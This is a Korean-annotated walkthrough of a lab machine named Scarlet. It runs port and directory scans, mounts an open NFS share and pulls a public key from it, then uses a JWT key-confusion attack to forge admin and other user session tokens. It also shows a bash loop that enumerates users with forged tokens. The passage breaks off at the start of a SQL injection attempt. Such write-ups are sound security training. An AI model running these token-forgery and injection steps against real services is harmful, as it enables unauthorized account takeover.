---
tags:
  - type/machine
  - platform/pg
  - os/linux
  - status/solved
  - tech/lin/suid
  - tech/lin/capabilities
  - tech/lin/cron
  - tech/lin/nfs
  - tech/lin/kernel-exploit
  - tech/web/sqli
  - tech/exec/ssh-key
  - tech/enum/dirbust
type: machine
platform: pg
os: linux
ip: 192.168.248.222
domain: scarlet.local
ports: [22, 80, 111, 2049, 33527, 41543]
services: [http, nfs_acl, nlockmgr, rpcbind, ssh, status]
status: solved
tech_count: 8
---
### Nmap

```bash
┌──(kali㉿kali)-[~/PG/Scarlet]
└─$ nnmap 192.168.248.222
Starting Nmap 7.98 ( https://nmap.org ) at 2026-08-19 12:56 +0900
Nmap scan report for 192.168.248.222
Host is up (0.085s latency).
Not shown: 65526 closed tcp ports (reset)
PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 b9:bc:8f:01:3f:85:5d:f9:5c:d9:fb:b6:15:a0:1e:74 (ECDSA)
|_  256 53:d9:7f:3d:22:8a:fd:57:98:fe:6b:1a:4c:ac:79:67 (ED25519)
80/tcp    open  http     nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Site doesn''t have a title (text/html).
111/tcp   open  rpcbind  2-4 (RPC #100000)
| rpcinfo:
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100003  3,4         2049/tcp   nfs
|   100005  1,2,3      53845/tcp   mountd
|   100005  1,2,3      58558/udp   mountd
|   100021  1,3,4      32877/udp   nlockmgr
|   100021  1,3,4      33527/tcp   nlockmgr
|   100024  1          39417/udp   status
|   100024  1          41543/tcp   status
|_  100227  3           2049/tcp   nfs_acl
2049/tcp  open  nfs_acl  3 (RPC #100227)
33527/tcp open  nlockmgr 1-4 (RPC #100021)
41543/tcp open  status   1 (RPC #100024)
53291/tcp open  mountd   1-3 (RPC #100005)
53845/tcp open  mountd   1-3 (RPC #100005)
59493/tcp open  mountd   1-3 (RPC #100005)
Device type: general purpose
Running: Linux 5.X
OS CPE: cpe:/o:linux:linux_kernel:5
OS details: Linux 5.0 - 5.14
Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 587/tcp)
HOP RTT      ADDRESS
1   84.39 ms 192.168.45.1
2   84.35 ms 192.168.45.254
3   85.18 ms 192.168.251.1
4   85.35 ms 192.168.248.222

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 27.54 seconds
```


### feroxbuster
```bash
┌──(kali㉿kali)-[~/PG/Scarlet]
└─$ feroxbuster -u http://192.168.248.222/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,txt,html,bak,zip -t 100

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.13.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://192.168.248.222/
 🚩  In-Scope Url          │ 192.168.248.222
 🚀  Threads               │ 100
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.13.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💲  Extensions            │ [php, txt, html, bak, zip]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        7l       12w      162c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET        1l        1w       66c http://192.168.248.222/
200      GET        1l        1w       66c http://192.168.248.222/index.html
[####################] - 3m    180000/180000  0s      found:2       errors:0
[####################] - 3m    180000/180000  1138/s  http://192.168.248.222/     
```

rpcinfo 실행
```bash
┌──(kali㉿kali)-[~/PG]
└─$ rpcinfo -p 192.168.248.222
   program vers proto   port  service
    100000    4   tcp    111  portmapper
    100000    3   tcp    111  portmapper
    100000    2   tcp    111  portmapper
    100000    4   udp    111  portmapper
    100000    3   udp    111  portmapper
    100000    2   udp    111  portmapper
    100005    1   udp  46813  mountd
    100005    1   tcp  53291  mountd
    100005    2   udp  36537  mountd
    100005    2   tcp  59493  mountd
    100005    3   udp  58558  mountd
    100005    3   tcp  53845  mountd
    100024    1   udp  39417  status
    100024    1   tcp  41543  status
    100003    3   tcp   2049  nfs
    100003    4   tcp   2049  nfs
    100227    3   tcp   2049  nfs_acl
    100021    1   udp  32877  nlockmgr
    100021    3   udp  32877  nlockmgr
    100021    4   udp  32877  nlockmgr
    100021    1   tcp  33527  nlockmgr
    100021    3   tcp  33527  nlockmgr
    100021    4   tcp  33527  nlockmgr

```



```bash
rpcinfo -T udp 192.168.248.222
   program version netid     address                service    owner
    100000    4    tcp       0.0.0.0.0.111          portmapper superuser
    100000    3    tcp       0.0.0.0.0.111          portmapper superuser
    100000    2    tcp       0.0.0.0.0.111          portmapper superuser
    100000    4    udp       0.0.0.0.0.111          portmapper superuser
    100000    3    udp       0.0.0.0.0.111          portmapper superuser
    100000    2    udp       0.0.0.0.0.111          portmapper superuser
    100000    4    local     /run/rpcbind.sock      portmapper superuser
    100000    3    local     /run/rpcbind.sock      portmapper superuser
    100005    1    udp       0.0.0.0.182.221        mountd     superuser
    100005    1    tcp       0.0.0.0.208.43         mountd     superuser
    100005    2    udp       0.0.0.0.142.185        mountd     superuser
    100005    2    tcp       0.0.0.0.232.101        mountd     superuser
    100005    3    udp       0.0.0.0.228.190        mountd     superuser
    100005    3    tcp       0.0.0.0.210.85         mountd     superuser
    100024    1    udp       0.0.0.0.153.249        status     114
    100024    1    tcp       0.0.0.0.162.71         status     114
    100003    3    tcp       0.0.0.0.8.1            nfs        superuser
    100003    4    tcp       0.0.0.0.8.1            nfs        superuser
    100227    3    tcp       0.0.0.0.8.1            nfs_acl    superuser
    100021    1    udp       0.0.0.0.128.109        nlockmgr   superuser
    100021    3    udp       0.0.0.0.128.109        nlockmgr   superuser
    100021    4    udp       0.0.0.0.128.109        nlockmgr   superuser
    100021    1    tcp       0.0.0.0.130.247        nlockmgr   superuser
    100021    3    tcp       0.0.0.0.130.247        nlockmgr   superuser
    100021    4    tcp       0.0.0.0.130.247        nlockmgr   superuser
```



아이피 추가 후 웹페이지 접근
```bash
┌──(kali㉿kali)-[~/PG]
└─$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
::1             localhost ip6-localhost ip6-loopback
ff02::1         ip6-allnodes
ff02::2         ip6-allrouter
240.0.0.1  nagoya.nagoya-industries.com
192.168.248.222 scarlet.local
```

웹 열거 다시
```bash
┌──(kali㉿kali)-[~/PG/Scarlet]
└─$ feroxbuster -u http://scarlet.local/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,txt,html,bak,zip -t 100

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.13.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://scarlet.local/
 🚩  In-Scope Url          │ scarlet.local
 🚀  Threads               │ 100
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.13.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💲  Extensions            │ [php, txt, html, bak, zip]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        1l        4w       27c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
302      GET        1l        4w       28c http://scarlet.local/logout => http://scarlet.local/login
301      GET       10l       16w      173c http://scarlet.local/css => http://scarlet.local/css/
200      GET        7l       74w     4617c http://scarlet.local/assets/bootstrap/css/bootstrap-reboot.min.css
301      GET       10l       16w      179c http://scarlet.local/assets => http://scarlet.local/assets/
200      GET      304l     1677w   138148c http://scarlet.local/assets/images/mbr-3.jpeg
302      GET        1l        4w       28c http://scarlet.local/portal => http://scarlet.local/login
200      GET      570l     3113w   280183c http://scarlet.local/assets/images/mbr.png
200      GET      934l     1582w    15529c http://scarlet.local/assets/socicon/css/styles.css
200      GET        6l     1919w   155585c http://scarlet.local/assets/bootstrap/css/bootstrap.min.css
200      GET       15l       35w      321c http://scarlet.local/assets/parallax/jarallax.css
200      GET      961l     1708w    14947c http://scarlet.local/assets/theme/css/style.css
200      GET      191l      409w     3817c http://scarlet.local/css/style.css
200      GET       94l      237w     3830c http://scarlet.local/login
200      GET      265l      748w     7945c http://scarlet.local/assets/dropdown/css/style.css
200      GET      498l      850w     8709c http://scarlet.local/assets/web/assets/mobirise-icons2/mobirise2.css
200      GET       94l      237w     3830c http://scarlet.local/Login
200      GET     1746l     4268w    42320c http://scarlet.local/assets/mobirise/css/mbr-additional.css
200      GET        6l      309w    51452c http://scarlet.local/assets/bootstrap/css/bootstrap-grid.min.css
301      GET       10l       16w      193c http://scarlet.local/assets/images => http://scarlet.local/assets/images/
200      GET      459l     2379w   190079c http://scarlet.local/assets/images/mbr-2.jpg
200      GET      880l     5197w   381436c http://scarlet.local/assets/images/mbr-10.jpg
301      GET       10l       16w      187c http://scarlet.local/assets/web => http://scarlet.local/assets/web/
200      GET     1316l     7711w   584073c http://scarlet.local/assets/images/mbr-9.jpg
200      GET      924l     5182w   590321c http://scarlet.local/assets/images/mbr-6.jpg
200      GET     2678l    14443w   831460c http://scarlet.local/assets/images/ali-morshedlou-wmd64tmfc4k-unsplash.jpg
301      GET       10l       16w      201c http://scarlet.local/assets/web/assets => http://scarlet.local/assets/web/assets/
301      GET       10l       16w      177c http://scarlet.local/views => http://scarlet.local/views/
301      GET       10l       16w      191c http://scarlet.local/assets/theme => http://scarlet.local/assets/theme/
200      GET     1484l     8955w   901311c http://scarlet.local/assets/images/dan-cornilov-ehuyu820lca-unsplash.jpg
200      GET     1086l     9298w   900460c http://scarlet.local/assets/images/linkedin-sales-solutions-pata8xe-ivm-unsplash.jpg
200      GET      405l     1254w    20445c http://scarlet.local/
200      GET      102l      285w     4294c http://scarlet.local/views/login.html
301      GET       10l       16w      199c http://scarlet.local/assets/theme/css => http://scarlet.local/assets/theme/css/
301      GET       10l       16w      197c http://scarlet.local/assets/theme/js => http://scarlet.local/assets/theme/js/
200      GET      405l     1254w    20445c http://scarlet.local/views/index.html
200      GET      109l      350w     6084c http://scarlet.local/views/portal.html
301      GET       10l       16w      181c http://scarlet.local/helpers => http://scarlet.local/helpers/
302      GET        1l        4w       28c http://scarlet.local/Portal => http://scarlet.local/login
302      GET        1l        4w       28c http://scarlet.local/Logout => http://scarlet.local/login
301      GET       10l       16w      197c http://scarlet.local/assets/dropdown => http://scarlet.local/assets/dropdown/
301      GET       10l       16w      203c http://scarlet.local/assets/dropdown/js => http://scarlet.local/assets/dropdown/js/
301      GET       10l       16w      205c http://scarlet.local/assets/dropdown/css => http://scarlet.local/assets/dropdown/css/
301      GET       10l       16w      179c http://scarlet.local/routes => http://scarlet.local/routes/
301      GET       10l       16w      187c http://scarlet.local/middleware => http://scarlet.local/middleware/
302      GET        1l        4w       28c http://scarlet.local/PORTAL => http://scarlet.local/login
[####################] - 6m   2880792/2880792 0s      found:45      errors:380474
[####################] - 5m    180000/180000  651/s   http://scarlet.local/
[####################] - 5m    180000/180000  662/s   http://scarlet.local/css/
[####################] - 5m    180000/180000  665/s   http://scarlet.local/assets/
[####################] - 5m    180000/180000  660/s   http://scarlet.local/assets/images/
[####################] - 4m    180000/180000  667/s   http://scarlet.local/assets/web/
[####################] - 5m    180000/180000  659/s   http://scarlet.local/assets/web/assets/
[####################] - 5m    180000/180000  660/s   http://scarlet.local/views/
[####################] - 5m    180000/180000  665/s   http://scarlet.local/assets/theme/
[####################] - 4m    180000/180000  667/s   http://scarlet.local/assets/theme/js/
[####################] - 5m    180000/180000  664/s   http://scarlet.local/assets/theme/css/
[####################] - 4m    180000/180000  667/s   http://scarlet.local/helpers/
[####################] - 4m    180000/180000  667/s   http://scarlet.local/assets/dropdown/
[####################] - 4m    180000/180000  672/s   http://scarlet.local/assets/dropdown/js/
[####################] - 4m    180000/180000  669/s   http://scarlet.local/assets/dropdown/css/
[####################] - 4m    180000/180000  689/s   http://scarlet.local/routes/
[####################] - 4m    180000/180000  740/s   http://scarlet.local/middleware/   
```


export 항목

```bash
┌──(kali㉿kali)-[~/PG/Scarlet]
└─$ showmount -e 192.168.248.222
Export list for 192.168.248.222:
/mnt/share *
```

nfs mount
```bash
┌──(kali㉿kali)-[~/PG/Scarlet]
└─$ mkdir -p /tmp/nfs

┌──(kali㉿kali)-[~/PG/Scarlet]
└─$ sudo mount -t nfs 192.168.248.222:/mnt/share /tmp/nfs -o nolock

┌──(kali㉿kali)-[~/PG/Scarlet]
└─$ ls -al /tmp/nfs
total 8
drwxrwxrwx  3 nobody nogroup 4096 Jul 18  2022 .
drwxrwxrwt 26 root   root     580 Aug 19 15:05 ..
drwxr-xr-x  2 root   root    4096 Jul 18  2022 essentials

┌──(kali㉿kali)-[~/PG/Scarlet]
└─$ cd /tmp/nfs/essentials

┌──(kali㉿kali)-[/tmp/nfs/essentials]
└─$ ls
public.key

┌──(kali㉿kali)-[/tmp/nfs/essentials]
└─$ cat public.key
-----BEGIN PUBLIC KEY-----
MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEA3dFqq0OaPITIrCHAN86q
GYIbNAJYlyodym1PNrklp0pD0ddhit7omVeVY6JYq+BDHaMgS6mBr20ecAf7oBUA
CAKgnAkZpUtUY0p5JMe5jEUbVVnZylwawiJP8MsU+F+vRf3UDSiJIRAff+rajdxb
dubApQakRdy4HfxMFTUGJEDm91YpjHCpLXslXub5pWZtA+4QeKzWCMO70PwWcEYA
Yv0Gif0yR4hGKm5ugI2KzCT1CbJAE++ZHryR0oMHjFIEPwFjDqdcQk0Z+nuDlmJL
vQdA2Y7O6k7OJLXbRvDH97+L4ouPcxj2gS+x25mlFBmiMZUXnj/ZqD2DGz5Yq+hB
f4DRAALZAv5zsN2uiPjU98IAm4jdqTw+yUxUkdX5bDomPF1jFvdWygsY8Yo5J3pk
xWhMvULam5kfs1Cu+RHR3fu9m7xi7QILkWVyOd8B0qfixtpGE20o6/VhuAS9rPBH
AMih9//ztpKStW0NNhtfYfsl9xenqt1E9GVr3js/OUYIcC4ZOLZT4ulluL0gAGWu
niDUq1os9iR2HzYBNOwlw77bipjACB0mxZE7WE2fQEtLnQ/K5yDQTQM4tr3r8X6L
RTAP0iwG56rcYiQtmM/shSocenRr228os666rQwFnxT7jugl0sRlsFqZNzgXWDn/
51qez+VrhIb63VuDyVKewPcCAwEAAQ==
-----END PUBLIC KEY-----
```

키 확인
```bash
┌──(kali㉿kali)-[/tmp/nfs/essentials]
└─$ openssl rsa -pubin -in public.key -text -noout | head -3
Public-Key: (4096 bit)
Modulus:
    00:dd:d1:6a:ab:43:9a:3c:84:c8:ac:21:c0:37:ce:
    ┌──(kali㉿kali)-[/tmp/nfs/essentials]
└─$ ssh-keygen -f public.key -e -m PKCS8 2>/dev/null | head

```

jwt 확인
```bash

┌──(kali㉿kali)-[/tmp/nfs/essentials]
└─$ curl -i -X POST http://scarlet.local/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"admin"}'
HTTP/1.1 302 Found
Server: nginx/1.18.0 (Ubuntu)
Date: Wed, 19 Aug 2026 06:10:33 GMT
Content-Type: text/plain; charset=utf-8
Content-Length: 69
Connection: keep-alive
X-Powered-By: Express
Location: /login?error=Invalid%20username%20or%20password
Vary: Accept

Found. Redirecting to /login?error=Invalid%20username%20or%20password                                 
┌──(kali㉿kali)-[/tmp/nfs/essentials]
└─$ curl -i -X POST http://scarlet.local/login \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=4leaf&password=password1"
HTTP/1.1 302 Found
Server: nginx/1.18.0 (Ubuntu)
Date: Wed, 19 Aug 2026 06:11:06 GMT
Content-Type: text/plain; charset=utf-8
Content-Length: 29
Connection: keep-alive
X-Powered-By: Express
Set-Cookie: session=eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IjRsZWFmIiwiaWF0IjoxNzg3MTE5ODY2fQ.CAOSvdGhpsxp6RTMguLf5wrRDsZWA-ewNHuGHW2D66Tat-sJiXl_jbJ2Wd7du_mW-GskiayTlG3FYhtm2wN5TKpavfDeHgFdJs91spCHXaUVP5TPFijeWKvI2Cf3Xf967xZP6PyjWInXB_jxVo_xGV3lM_Q_fMfbBUSQq0tKayJQgVkPVEsPmEvF-U1GRE0bj__ijqTXyrJXVv0HkXylB6g9-Gm_ersY5WKZgsRlVsnh42a550JmWguWzc6zX82lY1g7pfjOKuW7Iez5yP2DMr1v9R5kpelycbOaeNMUOpewXrUwHOV7fBtwZJEAmLosD27vW9xU_WwWd9k35oujrKovIesaMadGQ2KHPvvRyiR4HudvjRk-HLESZrFKQCY7LE-meuEiI8zvWaFTGJtAyCNkWk8CLEYCjmhtpqG8N_tqdUFWIMgyCszj8A2JedMVVMnt5LD7jHqw3Y7ki3fUEmSAwJnmZSFlCR8HZjVYVeL4b5w9MGeI5BXolhi6_RPOQPxeCT6jC5CZJmfz6KdSj8bEON5HN3Gk8It_AFQBokbxO95VFZpCdx2bySWfOX8BKIg1JRZiE-rsbwEXNGnh8ZhkBqkzJsXQ4PUOuABYsxxkpptjPrpH-xzq5nsqFzGcSHRIa2KgYZ_xQp59e3y7xYBHbLjqrsBwl_4gv__VRoo; Max-Age=900; Path=/; Expires=Wed, 19 Aug 2026 06:26:06 GMT
Location: /portal
Vary: Accept

Found. Redirecting to /portal      
```

jwt 검증
```bash
┌──(kali㉿kali)-[~/git/jwt_tool]
└─$  python jwt_tool.py eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IjRsZWFmIiwiaWF0IjoxNzg3MTE5ODY2fQ.CAOSvdGhpsxp6RTMguLf5wrRDsZWA-ewNHuGHW2D66Tat-sJiXl_jbJ2Wd7du_mW-GskiayTlG3FYhtm2wN5TKpavfDeHgFdJs91spCHXaUVP5TPFijeWKvI2Cf3Xf967xZP6PyjWInXB_jxVo_xGV3lM_Q_fMfbBUSQq0tKayJQgVkPVEsPmEvF-U1GRE0bj__ijqTXyrJXVv0HkXylB6g9-Gm_ersY5WKZgsRlVsnh42a550JmWguWzc6zX82lY1g7pfjOKuW7Iez5yP2DMr1v9R5kpelycbOaeNMUOpewXrUwHOV7fBtwZJEAmLosD27vW9xU_WwWd9k35oujrKovIesaMadGQ2KHPvvRyiR4HudvjRk-HLESZrFKQCY7LE-meuEiI8zvWaFTGJtAyCNkWk8CLEYCjmhtpqG8N_tqdUFWIMgyCszj8A2JedMVVMnt5LD7jHqw3Y7ki3fUEmSAwJnmZSFlCR8HZjVYVeL4b5w9MGeI5BXolhi6_RPOQPxeCT6jC5CZJmfz6KdSj8bEON5HN3Gk8It_AFQBokbxO95VFZpCdx2bySWfOX8BKIg1JRZiE-rsbwEXNGnh8ZhkBqkzJsXQ4PUOuABYsxxkpptjPrpH-xzq5nsqFzGcSHRIa2KgYZ_xQp59e3y7xYBHbLjqrsBwl_4gv__VRoo -X k -pk /tmp/nfs/essentials/public.key -T

        \   \        \         \          \                    \
   \__   |   |  \     |\__    __| \__    __|                    |
         |   |   \    |      |          |       \         \     |
         |        \   |      |          |    __  \     __  \    |
  \      |      _     |      |          |   |     |   |     |   |
   |     |     / \    |      |          |   |     |   |     |   |
\        |    /   \   |      |          |\        |\        |   |
 \______/ \__/     \__|   \__|      \__| \______/  \______/ \__|
 Version 2.3.0                \______|             @ticarpi

/home/kali/.jwt_tool/jwtconf.ini
Original JWT:


====================================================================
This option allows you to tamper with the header, contents and
signature of the JWT.
====================================================================

Token header values:
[1] alg = "RS256"
[2] typ = "JWT"
[3] *ADD A VALUE*
[4] *DELETE A VALUE*
[0] Continue to next step

Please select a field number:
(or 0 to Continue)
> 0

Token payload values:
[1] username = "4leaf"
[2] iat = 1787119866    ==> TIMESTAMP = 2026-08-19 15:11:06 (UTC)
[3] *ADD A VALUE*
[4] *DELETE A VALUE*
[5] *UPDATE TIMESTAMPS*
[0] Continue to next step

Please select a field number:
(or 0 to Continue)
> 0
File loaded: /tmp/nfs/essentials/public.key
jwttool_6cbb3756e7e57b0c3afe455ed7fabbad - EXPLOIT: Key-Confusion attack (signing using the Public Key as the HMAC secret)
(This will only be valid on unpatched implementations of JWT.)
[+] eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IjRsZWFmIiwiaWF0IjoxNzg3MTE5ODY2fQ.1t8YpvMp8bRijEzMb_ihIr-pKy2zciVb4jJzUDmUckA
```

jwt 사용 확인
```bash
┌──(kali㉿kali)-[/tmp/nfs/essentials]
└─$ curl -i http://scarlet.local/portal \
  -H "Cookie: session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IjRsZWFmIiwiaWF0IjoxNzg3MTE5ODY2fQ.1t8YpvMp8bRijEzMb_ihIr-pKy2zciVb4jJzUDmUckA"
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Wed, 19 Aug 2026 06:16:15 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 6070
Connection: keep-alive
X-Powered-By: Express
ETag: W/"17b6-S2iOoyef+QZxV0gETUqPAzQUxqk"

<!DOCTYPE html>
<html  >
<head>
  <!-- Site made with Mobirise Website Builder v5.6.5, https://mobirise.com -->
  <meta charset="UTF-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="generator" content="Mobirise v5.6.5, mobirise.com">
  <meta name="twitter:card" content="summary_large_image"/>
  <meta name="twitter:image:src" content="">
  <meta property="og:image" content="">
  <meta name="twitter:title" content="Page 1">
  <meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1">
  <link rel="shortcut icon" href="assets/images/mbr.png" type="image/x-icon">
  <meta name="description" content="">


  <title>Scarlet - Portal</title>
```

admin으로 위조 
```bash
┌──(kali㉿kali)-[~/git/jwt_tool]
└─$  python jwt_tool.py eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IjRsZWFmIiwiaWF0IjoxNzg3MTE5ODY2fQ.CAOSvdGhpsxp6RTMguLf5wrRDsZWA-ewNHuGHW2D66Tat-sJiXl_jbJ2Wd7du_mW-GskiayTlG3FYhtm2wN5TKpavfDeHgFdJs91spCHXaUVP5TPFijeWKvI2Cf3Xf967xZP6PyjWInXB_jxVo_xGV3lM_Q_fMfbBUSQq0tKayJQgVkPVEsPmEvF-U1GRE0bj__ijqTXyrJXVv0HkXylB6g9-Gm_ersY5WKZgsRlVsnh42a550JmWguWzc6zX82lY1g7pfjOKuW7Iez5yP2DMr1v9R5kpelycbOaeNMUOpewXrUwHOV7fBtwZJEAmLosD27vW9xU_WwWd9k35oujrKovIesaMadGQ2KHPvvRyiR4HudvjRk-HLESZrFKQCY7LE-meuEiI8zvWaFTGJtAyCNkWk8CLEYCjmhtpqG8N_tqdUFWIMgyCszj8A2JedMVVMnt5LD7jHqw3Y7ki3fUEmSAwJnmZSFlCR8HZjVYVeL4b5w9MGeI5BXolhi6_RPOQPxeCT6jC5CZJmfz6KdSj8bEON5HN3Gk8It_AFQBokbxO95VFZpCdx2bySWfOX8BKIg1JRZiE-rsbwEXNGnh8ZhkBqkzJsXQ4PUOuABYsxxkpptjPrpH-xzq5nsqFzGcSHRIa2KgYZ_xQp59e3y7xYBHbLjqrsBwl_4gv__VRoo -X k -pk /tmp/nfs/essentials/public.key -I -pc username -pv admin

        \   \        \         \          \                    \
   \__   |   |  \     |\__    __| \__    __|                    |
         |   |   \    |      |          |       \         \     |
         |        \   |      |          |    __  \     __  \    |
  \      |      _     |      |          |   |     |   |     |   |
   |     |     / \    |      |          |   |     |   |     |   |
\        |    /   \   |      |          |\        |\        |   |
 \______/ \__/     \__|   \__|      \__| \______/  \______/ \__|
 Version 2.3.0                \______|             @ticarpi

/home/kali/.jwt_tool/jwtconf.ini
Original JWT:

File loaded: /tmp/nfs/essentials/public.key
jwttool_2335501e4e6161b37d7c73791d092605 - EXPLOIT: Key-Confusion attack (signing using the Public Key as the HMAC secret)
(This will only be valid on unpatched implementations of JWT.)
[+] eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNzg3MTE5ODY2fQ.DHdnhNtQCIa6E51K9N6cGsXefSrJQkXWqr9c4cb34aA
```


유저 검색
```bash
┌──(kali㉿kali)-[/tmp/nfs/essentials]
└─$ #!/bin/bash
ORIG="eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IjRsZWFmIiwiaWF0IjoxNzg3MTE5ODY2fQ.CAOSvdGhpsxp6RTMguLf5wrRDsZWA-ewNHuGHW2D66Tat-sJiXl_jbJ2Wd7du_mW-GskiayTlG3FYhtm2wN5TKpavfDeHgFdJs91spCHXaUVP5TPFijeWKvI2Cf3Xf967xZP6PyjWInXB_jxVo_xGV3lM_Q_fMfbBUSQq0tKayJQgVkPVEsPmEvF-U1GRE0bj__ijqTXyrJXVv0HkXylB6g9-Gm_ersY5WKZgsRlVsnh42a550JmWguWzc6zX82lY1g7pfjOKuW7Iez5yP2DMr1v9R5kpelycbOaeNMUOpewXrUwHOV7fBtwZJEAmLosD27vW9xU_WwWd9k35oujrKovIesaMadGQ2KHPvvRyiR4HudvjRk-HLESZrFKQCY7LE-meuEiI8zvWaFTGJtAyCNkWk8CLEYCjmhtpqG8N_tqdUFWIMgyCszj8A2JedMVVMnt5LD7jHqw3Y7ki3fUEmSAwJnmZSFlCR8HZjVYVeL4b5w9MGeI5BXolhi6_RPOQPxeCT6jC5CZJmfz6KdSj8bEON5HN3Gk8It_AFQBokbxO95VFZpCdx2bySWfOX8BKIg1JRZiE-rsbwEXNGnh8ZhkBqkzJsXQ4PUOuABYsxxkpptjPrpH-xzq5nsqFzGcSHRIa2KgYZ_xQp59e3y7xYBHbLjqrsBwl_4gv__VRoo"
for u in brian.harper brianharper bharper brian harper b.harper brian_harper brianh will.johnson willjohnson wjohnson austin.carter acarter; do
  TOKEN=$(python /home/kali/git/jwt_tool/jwt_tool.py "$ORIG" -X k -pk /tmp/nfs/essentials/public.key -I -pc username -pv "$u" 2>/dev/null | grep -oP '(?<=\[\+\] )ey[A-Za-z0-9._-]+')
  RESP=$(curl -s http://scarlet.local/portal -H "Cookie: session=$TOKEN")
  if ! echo "$RESP" | grep -q "doesn't exist"; then
    echo "[+] VALID: $u"
  else
    echo "[-] $u"
  fi
done
[-] brian.harper
[-] brianharper
[-] bharper
[+] VALID: brian
[-] harper
[-] b.harper
[-] brian_harper
[-] brianh
[-] will.johnson
[-] willjohnson
[-] wjohnson
[-] austin.carter
[-] acarter
```

brian 아이디로 접근시 변동사항 없음

SQLi 진행
```bash
┌──(kali㉿kali)-[~/git/jwt_tool]
└─$ ORIG="eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IjRsZWFmIiwiaWF0IjoxNzg3MTE5ODY2fQ.CAOSvdGhpsxp6RTMguLf5wrRDsZWA-ewNHuGHW2D66Tat-sJiXl_jbJ2Wd7du_mW-GskiayTlG3FYhtm2wN5TKpavfDeHgFdJs91spCHXaUVP5TPFijeWKvI2Cf3Xf967xZP6PyjWInXB_jxVo_xGV3lM_Q_fMfbBUSQq0tKayJQgVkPVEsPmEvF-U1GRE0bj__ijqTXyrJXVv0HkXylB6g9-Gm_ersY5WKZgsRlVsnh42a550JmWguWzc6zX82lY1g7pfjOKuW7Iez5yP2DMr1v9R5kpelycbOaeNMUOpewXrUwHOV7fBtwZJEAmLosD27vW9xU_WwWd9k35oujrKovIesaMadGQ2KHPvvRyiR4HudvjRk-HLESZrFKQCY7LE-meuEiI8zvWaFTGJtAyCNkWk8CLEYCjmhtpqG8N_tqdUFWIMgyCszj8A2JedMVVMnt5LD7jHqw3Y7ki3fUEmSAwJnmZSFlCR8HZjVYVeL4b5w9MGeI5BXolhi6_RPOQPxeCT6jC5CZJmfz6KdSj8bEON5HN3Gk8It_AFQBokbxO95VFZpCdx2bySWfOX8BKIg1JRZiE-rsbwEXNGnh8ZhkBqkzJsXQ4PUOuABYsxxkpptjPrpH-xzq5nsqFzGcSHRIa2KgYZ_xQp59e3y7xYBHbLjqrsBwl_4gv__VRoo"

┌──(kali㉿kali)-[~/git/jwt_tool]
└─$ python jwt_tool.py "$ORIG" -X k -pk /tmp/nfs/essentials/public.key -I -pc username -pv "brian'"

        \   \        \         \          \                    \
   \__   |   |  \     |\__    __| \__    __|                    |
         |   |   \    |      |          |       \         \     |
         |        \   |      |          |    __  \     __  \    |
  \      |      _     |      |          |   |     |   |     |   |
   |     |     / \    |      |          |   |     |   |     |   |
\        |    /   \   |      |          |\        |\        |   |
 \______/ \__/     \__|   \__|      \__| \______/  \______/ \__|
